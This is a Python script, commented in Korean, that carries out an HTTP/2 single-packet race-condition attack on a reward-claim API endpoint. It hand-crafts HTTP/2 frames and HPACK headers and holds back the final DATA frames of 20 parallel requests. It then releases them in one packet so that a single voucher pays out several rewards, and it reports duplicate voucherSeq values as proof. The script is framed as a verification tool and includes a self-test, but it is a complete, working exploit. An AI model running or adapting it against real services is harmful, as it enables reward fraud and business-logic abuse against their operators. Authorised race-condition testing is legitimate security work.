#!/usr/bin/env python3
"""
POST .../reward/claim 레이스 검증 - [HTTP/2 단일 패킷 공격판]

대상: HTTP/2 를 지원하는 프론트 (nginx `http2 on;`, ssl_protocols TLSv1.2 TLSv1.3).
      HTTP/2 미지원(TLSv1.2 전용/HTTP1.1) 프론트는 이 기법이 안 되고
      race_test_claim.py(라스트바이트 동기화)를 쓴다.

── 단일 패킷 공격(single-packet attack, James Kettle) ──────────────────────
HTTP/2 는 한 TCP 연결에서 여러 요청(스트림)을 병렬로 보낸다. 이를 이용해
N개 요청을 '거의 한 TCP 패킷'에 담아 서버에 동시에 도착시키면, 네트워크 지터가
사실상 0이 되어 레이스 윈도우를 가장 정확히 맞출 수 있다(라스트바이트 동기화보다 강함).

구현(stdlib socket/ssl + 직접 만든 HTTP/2 프레임 + 최소 HPACK literal 인코딩):
  1) TLS ALPN 으로 h2 협상, 커넥션 프리페이스 + SETTINGS 전송.
  2) N개 스트림(1,3,5,...)에 대해 HEADERS 프레임만 먼저 보낸다
     (END_STREAM 안 붙임 → 서버는 각 요청을 아직 '완성 안 됨'으로 대기).
  3) 마지막에 N개의 '빈 DATA(END_STREAM)' 프레임을 '한 번의 sendall' 로 몰아 보낸다
     → 하나의 패킷으로 합쳐져 모든 요청이 동시에 '완성'되어 디스패치된다.

판정: DATA 프레임 본문(JSON)에 rewardType 이 있으면 성공. 여러 성공에 동일한
voucherSeq 가 중복 등장하면 결정적 증거(응답 헤더는 HPACK 압축이라
디코드하지 않고 본문 JSON 으로만 판정한다).

self-test: `--selftest` 는 서버 없이 HEADERS 블록을 만들어 자체 디코더로 되돌려
인코딩 정확성을 검증한다(로컬엔 h2 서버가 없어 프레이밍만 검증).
"""
from __future__ import annotations

import argparse
import json
import socket
import ssl
import time
from urllib.parse import urlparse

# ── HTTP/2 상수 ──
PREFACE = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
FT_DATA, FT_HEADERS, FT_RST, FT_SETTINGS, FT_PING, FT_GOAWAY, FT_WINDOW = 0x0, 0x1, 0x3, 0x4, 0x6, 0x7, 0x8
FL_END_STREAM, FL_END_HEADERS, FL_ACK, FL_PADDED = 0x1, 0x4, 0x1, 0x8

DEFAULT_HEADERS = {
    "x-session-id": "REPLACE_WITH_YOUR_SESSION_ID",
    "x-client-agent": "client/3.1.0,android_10",
}


# ── HPACK (literal, 허프만/인덱싱 없음) ──
def hpack_int(value: int, prefix_bits: int) -> bytes:
    maxp = (1 << prefix_bits) - 1
    if value < maxp:
        return bytes([value])
    out = bytearray([maxp])
    value -= maxp
    while value >= 128:
        out.append((value & 0x7F) | 0x80)
        value >>= 7
    out.append(value)
    return bytes(out)


def hpack_str(s: bytes) -> bytes:
    # H=0 (no huffman). 길이는 7-bit prefix 정수.
    return hpack_int(len(s), 7) + s


def hpack_header(name: bytes, value: bytes) -> bytes:
    # literal header field without indexing, new name (0x00 prefix)
    return b"\x00" + hpack_str(name) + hpack_str(value)


def build_header_block(method: str, scheme: str, authority: str, path: str, headers: dict) -> bytes:
    block = b""
    # pseudo-headers first (모두 소문자, HTTP/2 규칙)
    block += hpack_header(b":method", method.encode())
    block += hpack_header(b":scheme", scheme.encode())
    block += hpack_header(b":authority", authority.encode())
    block += hpack_header(b":path", path.encode())
    for k, v in headers.items():
        block += hpack_header(k.lower().encode(), str(v).encode())
    return block


# ── HPACK literal 디코더 (self-test 전용) ──
def hpack_decode_int(buf, i, prefix_bits):
    maxp = (1 << prefix_bits) - 1
    b = buf[i] & maxp
    i += 1
    if b < maxp:
        return b, i
    m = 0
    while True:
        nb = buf[i]; i += 1
        b += (nb & 0x7F) << m
        m += 7
        if not (nb & 0x80):
            break
    return b, i


def hpack_decode_block(block):
    out, i = [], 0
    while i < len(block):
        assert block[i] == 0x00, "self-test 는 literal(0x00)만 지원"
        i += 1
        nlen, i = hpack_decode_int(block, i, 7)
        name = block[i:i + nlen]; i += nlen
        vlen, i = hpack_decode_int(block, i, 7)
        val = block[i:i + vlen]; i += vlen
        out.append((name.decode(), val.decode()))
    return out


# ── 프레임 ──
def frame(ftype: int, flags: int, stream_id: int, payload: bytes) -> bytes:
    return (len(payload).to_bytes(3, "big") + bytes([ftype, flags])
            + (stream_id & 0x7FFFFFFF).to_bytes(4, "big") + payload)


def read_frame(sock):
    hdr = _recv_exact(sock, 9)
    if hdr is None:
        return None
    length = int.from_bytes(hdr[0:3], "big")
    ftype, flags = hdr[3], hdr[4]
    sid = int.from_bytes(hdr[5:9], "big") & 0x7FFFFFFF
    payload = _recv_exact(sock, length) if length else b""
    if payload is None:
        return None
    return ftype, flags, sid, payload


def _recv_exact(sock, n):
    buf = b""
    while len(buf) < n:
        try:
            chunk = sock.recv(n - len(buf))
        except (socket.timeout, ssl.SSLWantReadError):
            return None
        if not chunk:
            return None if not buf else buf
        buf += chunk
    return buf


def parse_url(url):
    p = urlparse(url)
    scheme = p.scheme or "https"
    host = p.hostname or ""
    port = p.port or (443 if scheme == "https" else 80)
    path = p.path or "/"
    if p.query:
        path += "?" + p.query
    return scheme, host, port, path


def is_success(body_bytes) -> tuple[bool, dict | None]:
    try:
        obj = json.loads(body_bytes.decode("utf-8", errors="replace"))
    except Exception:
        return False, None
    if isinstance(obj, dict) and obj.get("rewardType"):
        return True, obj
    return False, obj if isinstance(obj, dict) else None


def run(url, concurrent, method, settle, timeout, insecure, extra_headers):
    scheme, host, port, path = parse_url(url)
    if scheme != "https":
        print("HTTP/2 단일 패킷 공격은 https(h2) 대상만. --url https://... 로.")
        return 1

    ctx = ssl.create_default_context()
    ctx.set_alpn_protocols(["h2", "http/1.1"])
    if insecure:
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE

    raw = socket.create_connection((host, port), timeout=timeout)
    raw.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    sock = ctx.wrap_socket(raw, server_hostname=host)
    alpn = sock.selected_alpn_protocol()
    print(f"=== [single-packet/h2] 대상: {url}  (동시 {concurrent} 스트림) ===")
    print(f"    ALPN 협상 결과: {alpn!r}")
    if alpn != "h2":
        print("    서버가 h2 를 협상하지 않음 → 이 대상엔 라스트바이트 동기화 테스터를 쓰세요.")
        sock.close()
        return 1

    headers = {**DEFAULT_HEADERS, **(extra_headers or {})}

    # 1) 프리페이스 + SETTINGS
    sock.sendall(PREFACE + frame(FT_SETTINGS, 0, 0, b""))

    # 2) 각 스트림에 HEADERS 만 먼저 (END_STREAM 미포함)
    stream_ids = [1 + 2 * i for i in range(concurrent)]
    pre = b""
    for sid in stream_ids:
        block = build_header_block(method, scheme, f"{host}:{port}" if port != 443 else host, path, headers)
        pre += frame(FT_HEADERS, FL_END_HEADERS, sid, block)
    sock.sendall(pre)

    # 3) 서버가 park 되도록 잠깐, 그 다음 빈 DATA(END_STREAM) 를 '한 번에' → 단일 패킷
    time.sleep(settle)
    burst = b"".join(frame(FT_DATA, FL_END_STREAM, sid, b"") for sid in stream_ids)
    t0 = time.perf_counter()
    sock.sendall(burst)

    # 4) 응답 수신
    sock.settimeout(timeout)
    bodies: dict[int, bytes] = {sid: b"" for sid in stream_ids}
    done: set[int] = set()
    while len(done) < len(stream_ids):
        fr = read_frame(sock)
        if fr is None:
            break
        ftype, flags, sid, payload = fr
        if ftype == FT_SETTINGS and not (flags & FL_ACK):
            sock.sendall(frame(FT_SETTINGS, FL_ACK, 0, b""))       # SETTINGS ACK
        elif ftype == FT_PING and not (flags & FL_ACK):
            sock.sendall(frame(FT_PING, FL_ACK, 0, payload))       # PING ACK
        elif ftype == FT_DATA and sid in bodies:
            data = payload
            if flags & FL_PADDED and data:
                pad = data[0]
                data = data[1:len(data) - pad]
            bodies[sid] += data
            if flags & FL_END_STREAM:
                done.add(sid)
        elif ftype == FT_HEADERS and (flags & FL_END_STREAM) and sid in bodies:
            done.add(sid)
        elif ftype == FT_GOAWAY:
            break
    elapsed = round(time.perf_counter() - t0, 4)
    sock.close()

    print(f"\n=== 총 {concurrent} 스트림 결과 (수신까지 {elapsed}s) ===")
    success, seqs = 0, []
    for i, sid in enumerate(stream_ids):
        ok, obj = is_success(bodies[sid])
        success += ok
        if ok and obj:
            seqs.append(obj.get("voucherSeq"))
        shown = obj if obj is not None else bodies[sid][:120]
        print(f"[stream {sid:>3}] {'SUCCESS' if ok else 'blocked'} body={shown}")

    print(f"\n성공(보상 지급) 응답 수: {success} / {concurrent}")
    if success >= 2:
        print("=> 발급권 1개로 2건 이상 보상 지급됨: 레이스 컨디션 재현")
        dup = {s for s in seqs if seqs.count(s) > 1}
        if dup:
            print(f"=> 결정적 증거: 동일 voucherSeq({dup}) 중복 등장")
        return 2
    print("=> 1건만 성공: 이번 실행에선 레이스 미재현 (반복 실행 권장)")
    return 0


def selftest() -> int:
    print("[selftest] HEADERS 블록 인코딩→디코딩 라운드트립 검증")
    block = build_header_block(
        "POST", "https", "front.example.local",
        "/api/reward/claim", DEFAULT_HEADERS,
    )
    decoded = hpack_decode_block(block)
    expected = [
        (":method", "POST"), (":scheme", "https"),
        (":authority", "front.example.local"), (":path", "/api/reward/claim"),
        ("x-session-id", DEFAULT_HEADERS["x-session-id"]),
        ("x-client-agent", DEFAULT_HEADERS["x-client-agent"]),
    ]
    for got, exp in zip(decoded, expected):
        assert got == exp, f"mismatch: {got} != {exp}"
    assert len(decoded) == len(expected), f"count {len(decoded)} != {len(expected)}"
    # 프레임 구성 확인
    hf = frame(FT_HEADERS, FL_END_HEADERS, 1, block)
    df = frame(FT_DATA, FL_END_STREAM, 1, b"")
    assert hf[3] == FT_HEADERS and hf[4] == FL_END_HEADERS
    assert df[3] == FT_DATA and df[4] == FL_END_STREAM and len(df) == 9
    burst = b"".join(frame(FT_DATA, FL_END_STREAM, 1 + 2 * i, b"") for i in range(20))
    assert len(burst) == 9 * 20, "20 스트림 DATA burst = 180 bytes (한 패킷)"
    print(f"[selftest] OK — HEADERS {len(decoded)}필드 round-trip, "
          f"단일 패킷 DATA burst {len(burst)}bytes(20스트림)")
    return 0


def main() -> int:
    ap = argparse.ArgumentParser(description="claim 레이스 검증 (HTTP/2 단일 패킷 공격)")
    ap.add_argument("--url", help="대상 https URL, 예: https://<h2-front-host>/api/reward/claim")
    ap.add_argument("-n", "--concurrent", type=int, default=20, help="동시 스트림 수 (기본 20)")
    ap.add_argument("--method", default="POST")
    ap.add_argument("--settle", type=float, default=0.1, help="HEADERS 후 DATA burst 전 정착 대기(초)")
    ap.add_argument("--timeout", type=float, default=10.0)
    ap.add_argument("--insecure", action="store_true", help="인증서 검증 해제(사설/랩)")
    ap.add_argument("-H", "--header", action="append", default=[], help="추가 헤더 'Key: Value'")
    ap.add_argument("--selftest", action="store_true", help="서버 없이 프레이밍/HPACK 검증")
    args = ap.parse_args()

    if args.selftest:
        return selftest()
    if not args.url:
        ap.error("--url 또는 --selftest 필요")
    extra = {}
    for h in args.header:
        if ":" in h:
            k, v = h.split(":", 1)
            extra[k.strip()] = v.strip()
    return run(args.url, args.concurrent, args.method, args.settle, args.timeout, args.insecure, extra)


if __name__ == "__main__":
    raise SystemExit(main())
